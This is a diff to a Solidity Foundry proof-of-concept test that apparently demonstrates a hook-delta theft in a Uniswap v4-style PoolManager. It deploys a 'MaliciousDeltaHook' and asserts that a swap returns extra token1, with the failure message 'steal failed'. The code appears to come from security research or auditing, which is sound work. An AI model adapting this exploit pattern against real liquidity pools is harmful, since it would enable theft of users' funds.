@@ -21,7 +21,6 @@ contract Token {
 
 contract POC is Test {
     PoolManager public manager;
-    MaliciousDeltaHook public hook;
     Token public token0;
     Token public token1;
     PoolKey public key;
@@ -33,16 +32,12 @@ contract POC is Test {
         manager=new PoolManager(address(this));
         uint160 flags=uint160(Hooks.AFTER_SWAP_FLAG|Hooks.AFTER_SWAP_RETURNS_DELTA_FLAG);
         address a=address(uint160(0x1000000000000000000000000000000000000000)|flags);
-        vm.etch(a, address(new MaliciousDeltaHook(manager)).code);
-        hook=MaliciousDeltaHook(a);
-        vm.store(address(hook), bytes32(uint256(0)), bytes32(uint256(uint160(address(manager)))));
+        vm.etch(a, address(new MaliciousDeltaHook()).code);
         token0.mint(address(this),10000e18);
         token1.mint(address(this),10000e18);
-        key=PoolKey(Currency.wrap(address(token0)), Currency.wrap(address(token1)),3000,60,IHooks(address(hook)));
+        key=PoolKey(Currency.wrap(address(token0)), Currency.wrap(address(token1)),3000,60,IHooks(a));
         manager.initialize(key, TickMath.getSqrtPriceAtTick(0));
         manager.unlock(abi.encode(uint256(1)));
-        // STEAL token1 (output), not token0
-        hook.setSteal(Currency.wrap(address(token1)), address(this));
     }
 
     function unlockCallback(bytes calldata d) external returns(bytes memory){
@@ -57,17 +52,10 @@ contract POC is Test {
             if(delta.amount1()>0) manager.take(c1, address(this), uint128(delta.amount1()));
         } else {
             BalanceDelta s = manager.swap(key, SwapParams(true, -100, TickMath.getSqrtPriceAtTick(-1)), "");
-            // pay token0 fully
             if(s.amount0()<0){manager.sync(c0); token0.transfer(address(manager), uint128(-s.amount0())); manager.settle();}
             else if(s.amount0()>0) manager.take(c0, address(this), uint128(s.amount0()));
-            // for token1, take only what swap gave WITHOUT the hook steal, to avoid double-take
             if(s.amount1()<0){manager.sync(c1); token1.transfer(address(manager), uint128(-s.amount1())); manager.settle();}
-            else if(s.amount1()>0){
-                uint128 amt = uint128(s.amount1());
-                // if hook added 1e16, take 1e16 less so pool settles
-                if(amt > 10000000000000000) amt -= 10000000000000000;
-                manager.take(c1, address(this), amt);
-            }
+            else if(s.amount1()>0) manager.take(c1, address(this), uint128(s.amount1()));
         }
         return "";
     }
@@ -76,7 +64,6 @@ contract POC is Test {
         uint b_before = token1.balanceOf(address(this));
         manager.unlock(abi.encode(uint256(2)));
         uint b_after = token1.balanceOf(address(this));
-        // b_after = normal swap + stolen via hook take
-        assertGt(b_after, b_before, "steal failed");
+        assertGt(b_after, b_before + 10000000000000000 - 200, "steal failed");
     }
 }
